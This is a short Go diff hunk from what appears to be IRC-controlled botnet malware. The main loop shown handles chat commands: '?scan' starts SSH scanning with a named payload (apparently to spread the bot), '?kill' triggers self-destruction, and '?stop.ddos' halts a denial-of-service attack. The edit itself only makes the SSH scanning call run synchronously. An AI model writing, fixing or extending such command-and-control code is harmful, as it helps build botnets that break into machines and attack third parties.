@@ -98,7 +98,7 @@ func main() {
 			} else if tools.IRC_Find(ircRead, "?scan") {
 				tools.Scan_Switch = false
 				tools.IRC_Send(irc, "PRIVMSG "+IRC_Channel+" :START SCANNING.")
-				go tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
+				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, Payload_Name)
 			} else if tools.IRC_Find(ircRead, "?kill") {
 				selfDestruct()
 			} else if tools.IRC_Find(ircRead, "?stop.ddos") {
